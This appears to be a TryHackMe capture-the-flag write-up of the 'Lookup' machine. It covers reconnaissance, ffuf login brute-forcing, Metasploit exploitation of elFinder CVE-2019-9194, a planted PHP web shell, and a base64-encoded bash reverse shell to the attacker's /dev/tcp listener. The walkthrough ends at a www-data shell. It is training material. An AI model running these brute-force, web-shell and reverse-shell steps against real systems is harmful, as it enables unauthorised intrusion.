# Lookup

This is first machine i did at Tryhackme

### Host Information Gathering

### Add host to /etc/hosts
```
echo "10.80.183.237 lookup.thm" | sudo tee -a /etc/hosts
```

<img width="646" height="313" alt="image" src="https://github.com/user-attachments/assets/4ad31f30-1fbc-443c-90aa-468e55ddf4eb" />

### Nmap:

```
[ Oguri ~ ]$ nmap -sC -sV 10.80.183.237
Starting Nmap 7.98 ( https://nmap.org ) at 2025-11-25 14:50 +0000
Nmap scan report for lookup.thm (10.80.183.237)
Host is up (0.044s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9d:f8:d7:4b:6c:fd:13:dc:83:ff:24:04:39:9a:1e:bf (RSA)
|   256 12:15:39:68:25:5a:65:5b:4c:c4:b6:7d:af:26:73:b6 (ECDSA)
|_  256 f1:16:f7:cd:1d:64:69:07:28:5e:98:4e:f2:d1:10:9f (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Login Page
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.29 seconds
```

## Web Information Gathering

### Fuzzing:
```
[ Oguri ~ ]$ feroxbuster --url http://lookup.thm/ -w /home/caffra/Wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
                                                                                                                                                                                  
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://lookup.thm/
 🚩  In-Scope Url          │ lookup.thm
 🚀  Threads               │ 50
 📖  Wordlist              │ /home/caffra/Wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        0w        1c http://lookup.thm/login.php
200      GET       50l       84w      687c http://lookup.thm/styles.css
200      GET       26l       50w      719c http://lookup.thm/
```

### Whatweb:
```
[ Oguri ~ ]$ whatweb 10.80.183.237
ERROR Opening: https://10.80.183.237 - Connection refused - connect(2) for "10.80.183.237" port 443
http://10.80.183.237 [302 Found] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.80.183.237], RedirectLocation[http://lookup.thm]
http://lookup.thm [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.80.183.237], PasswordField[password], Title[Login Page]
```
Nothing intresting

## Brute-Force
The first thing visible on the website is a login page, which makes it a good target for initial testing.
<img width="2218" height="571" alt="image" src="https://github.com/user-attachments/assets/806a59be-607f-4e33-9e38-288113886e7e" />

### FFUF:
```
[ Oguri ~ ]$ ffuf -u 'http://lookup.thm/login.php' -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'username=FUZZ&password=test' -w /home/caffra/Wordlists/SecLists/Usernames/Names/names.txt -t 10 -mc all -fs 74

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://lookup.thm/login.php
 :: Wordlist         : FUZZ: /home/caffra/Wordlists/SecLists/Usernames/Names/names.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&password=test
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 10
 :: Matcher          : Response status: all
 :: Filter           : Response size: 74
________________________________________________

admin                   [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 40ms]
jose                    [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 43ms]
:: Progress: [10713/10713] :: Job [1/1] :: 230 req/sec :: Duration: [0:00:47] :: Errors: 0 ::
```
Like that we got two users
- **admin**
- **jose**

```
[ Oguri ~ ]$ ffuf -u 'http://lookup.thm/login.php' -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'username=jose&password=FUZZ' -w /home/caffra/Wordlists/rockyou.txt  -t 10 -mc all -fs 62

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://lookup.thm/login.php
 :: Wordlist         : FUZZ: /home/caffra/Wordlists/rockyou.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=jose&password=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 10
 :: Matcher          : Response status: all
 :: Filter           : Response size: 62
________________________________________________

password123             [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 41ms]
```
Jose has **password123** as password

## After Brute-force
We can see website redirect to **http://files.lookup.thm** so its good idea to **add it to /etc/hosts**
<img width="1877" height="381" alt="image" src="https://github.com/user-attachments/assets/6dd87315-dcf9-422e-8d3b-fa4a914f3506" />

and like that we got it 
<img width="2254" height="373" alt="image" src="https://github.com/user-attachments/assets/4e0cfb97-959b-4677-a946-24325cb71ce5" />

We can see this is outdated librarie
https://nvd.nist.gov/vuln/detail/CVE-2019-9194
<img width="1365" height="437" alt="image" src="https://github.com/user-attachments/assets/5d3ef046-620d-4465-9ed8-50b7cee1fa07" />

### Metasploit:
```
msfconsole
search elfinder 2.1.47
use 0
show options
set LHOST tun0
set RHOST files.lookup.thm
run
```
Output:
```
[*] Started reverse TCP handler on 192.168.138.9:4444 
[*] Uploading payload '0EbmAbJQ.jpg;echo 6370202e2e2f66696c65732f3045626d41624a512e6a70672a6563686f2a202e33474c396c746d4c752e706870 |xxd -r -p |sh& #.jpg' (1959 bytes)
[*] Triggering vulnerability via image rotation ...
[*] Executing payload (/elFinder/php/.3GL9ltmLu.php) ...
[*] Sending stage (41224 bytes) to 10.80.133.47
[+] Deleted .3GL9ltmLu.php
[*] Meterpreter session 1 opened (192.168.138.9:4444 -> 10.80.133.47:52754) at 2025-11-25 20:56:48 +0000
```
Now we create RCE
```
[ Oguri ~/Desktop/CTF/Lookup ]$ echo '<?php system($_GET["cmd"]) ?>' > rce.php
[ Oguri ~/Desktop/CTF/Lookup ]$ ls
rce.php
[ Oguri ~/Desktop/CTF/Lookup ]$ cat rce.php 
<?php system($_GET["cmd"]) ?>
```
And upload to web
```
meterpreter > upload /home/caffra/Desktop/CTF/Lookup/rce.php
[*] Uploading  : /home/caffra/Desktop/CTF/Lookup/rce.php -> rce.php
[*] Uploaded -1.00 B of 30.00 B (-3.33%): /home/caffra/Desktop/CTF/Lookup/rce.php -> rce.php
[*] Completed  : /home/caffra/Desktop/CTF/Lookup/rce.php -> rce.php
meterpreter > ls
Listing: /var/www/files.lookup.thm/public_html
==============================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040111/--x--x--x  4096  dir   2024-04-02 12:30:58 +0000  elFinder
100644/rw-r--r--  706   fil   2024-01-11 20:20:18 +0000  index.php
100644/rw-r--r--  30    fil   2025-11-25 21:14:59 +0000  rce.php
```
We can prepare "rev" at https://www.revshells.com/
```
[ Oguri ~/Desktop ]$ echo '/bin/bash -i >& /dev/tcp/192.168.138.9/9001 0>&1' | base64
L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTM4LjkvOTAwMSAwPiYxCg==
```
Set a Netcat
```
[ Oguri ~/Desktop/CTF/Lookup ]$ nc -lvnp 9001
Listening on 0.0.0.0 9001
```
Use it at web like that:
```
http://files.lookup.thm/rce.php?cmd=echo 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTM4LjkvOTAwMSAwPiYxCg==' | base64 -d | bash
```

And like that we are in:
```
[ Oguri ~/Desktop/CTF/Lookup ]$ nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on 10.80.133.47 46692
bash: cannot set terminal process group (809): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-80-133-47:/var/www/files.lookup.thm/public_html$ 
```
